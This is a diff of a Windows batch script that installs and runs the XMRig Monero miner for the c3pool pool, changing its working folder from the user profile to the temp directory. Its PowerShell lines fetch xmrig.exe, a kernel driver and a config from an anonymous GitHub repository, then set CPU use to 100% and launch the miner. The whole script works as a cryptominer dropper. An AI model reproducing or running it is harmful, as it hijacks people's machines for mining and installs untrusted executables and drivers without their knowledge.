@@ -34,13 +34,13 @@ exit /b 1
 
 :WALLET_LEN_OK
 
-if ["%USERPROFILE%"] == [""] (
+if ["%TEMP%"] == [""] (
   echo ERROR: Please define USERPROFILE environment variable to your user directory
   exit /b 1
 )
 
-if not exist "%USERPROFILE%" (
-  echo ERROR: Please make sure user directory %USERPROFILE% exists
+if not exist "%TEMP%" (
+  echo ERROR: Please make sure user directory %TEMP% exists
   exit /b 1
 )
 
@@ -164,10 +164,10 @@ set PORT=80
 
 rem printing intentions
 
-set "LOGFILE=%USERPROFILE%\c3pool\xmrig.log"
+set "LOGFILE=%TEMP%\c3pool\xmrig.log"
 
 echo I will download, setup and run in background Monero CPU miner with logs in %LOGFILE% file.
-echo If needed, miner in foreground can be started by %USERPROFILE%\c3pool\miner.bat script.
+echo If needed, miner in foreground can be started by %TEMP%\c3pool\miner.bat script.
 echo Mining will happen to %WALLET% wallet.
 
 if not [%EMAIL%] == [] (
@@ -196,19 +196,19 @@ sc delete c3pool_miner
 taskkill /f /t /im xmrig.exe
 
 :REMOVE_DIR0
-echo [*] Removing "%USERPROFILE%\c3pool" directory
-rmdir /q /s "%USERPROFILE%\c3pool" >NUL 2>NUL
+echo [*] Removing "%TEMP%\c3pool" directory
+rmdir /q /s "%TEMP%\c3pool" >NUL 2>NUL
 
-IF EXIST "%USERPROFILE%\c3pool" GOTO REMOVE_DIR0
+IF EXIST "%TEMP%\c3pool" GOTO REMOVE_DIR0
 
-mkdir %USERPROFILE%\c3pool
+mkdir %TEMP%\c3pool
 
-powershell (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/hellothere5495/hello-there/main/xmrig.exe', '%USERPROFILE%\c3pool\xmrig.exe')
-powershell (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/hellothere5495/hello-there/main/WinRing0x64.sys', '%USERPROFILE%\c3pool\WinRing0x64.sys')
-powershell (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/hellothere5495/hello-there/main/config.json', '%USERPROFILE%\c3pool\config.json')
+powershell (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/hellothere5495/hello-there/main/xmrig.exe', '%TEMP%\c3pool\xmrig.exe')
+powershell (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/hellothere5495/hello-there/main/WinRing0x64.sys', '%TEMP%\c3pool\WinRing0x64.sys')
+powershell (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/hellothere5495/hello-there/main/config.json', '%TEMP%\c3pool\config.json')
 :MINER_OK
 
-echo [*] Miner "%USERPROFILE%\c3pool\xmrig.exe" is OK
+echo [*] Miner "%TEMP%\c3pool\xmrig.exe" is OK
 
 for /f "tokens=*" %%a in ('powershell -Command "hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}"') do set PASS=%%a
 if [%PASS%] == [] (
@@ -218,15 +218,15 @@ if not [%EMAIL%] == [] (
   set "PASS=%PASS%:%EMAIL%"
 )
 
-powershell -Command "$out = cat '%USERPROFILE%\c3pool\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"mine.c3pool.com:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config.json'" 
-powershell -Command "$out = cat '%USERPROFILE%\c3pool\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config.json'" 
-powershell -Command "$out = cat '%USERPROFILE%\c3pool\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config.json'" 
-powershell -Command "$out = cat '%USERPROFILE%\c3pool\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config.json'" 
+powershell -Command "$out = cat '%TEMP%\c3pool\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"mine.c3pool.com:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%TEMP%\c3pool\config.json'" 
+powershell -Command "$out = cat '%TEMP%\c3pool\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII '%TEMP%\c3pool\config.json'" 
+powershell -Command "$out = cat '%TEMP%\c3pool\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%TEMP%\c3pool\config.json'" 
+powershell -Command "$out = cat '%TEMP%\c3pool\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII '%TEMP%\c3pool\config.json'" 
 set LOGFILE2=%LOGFILE:\=\\%
-powershell -Command "$out = cat '%USERPROFILE%\c3pool\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"%LOGFILE2%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config.json'" 
+powershell -Command "$out = cat '%TEMP%\c3pool\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"%LOGFILE2%\",'} | Out-String; $out | Out-File -Encoding ASCII '%TEMP%\c3pool\config.json'" 
 
-copy /Y "%USERPROFILE%\c3pool\config.json" "%USERPROFILE%\c3pool\config_background.json" >NUL
-powershell -Command "$out = cat '%USERPROFILE%\c3pool\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config_background.json'" 
+copy /Y "%TEMP%\c3pool\config.json" "%TEMP%\c3pool\config_background.json" >NUL
+powershell -Command "$out = cat '%TEMP%\c3pool\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%TEMP%\c3pool\config_background.json'" 
 
 rem preparing script
 (
@@ -239,10 +239,10 @@ echo :ALREADY_RUNNING
 echo echo Monero miner is already running in the background. Refusing to run another one.
 echo echo Run "taskkill /IM xmrig.exe" if you want to remove background miner first.
 echo :EXIT
-) > "%USERPROFILE%\c3pool\miner.bat"
+) > "%TEMP%\c3pool\miner.bat"
 
 rem preparing script background work and work under reboot
-%USERPROFILE%\c3pool\xmrig.exe %USERPROFILE%\c3pool\config.json
+%TEMP%\c3pool\xmrig.exe %TEMP%\c3pool\config.json
 
 goto OK
 
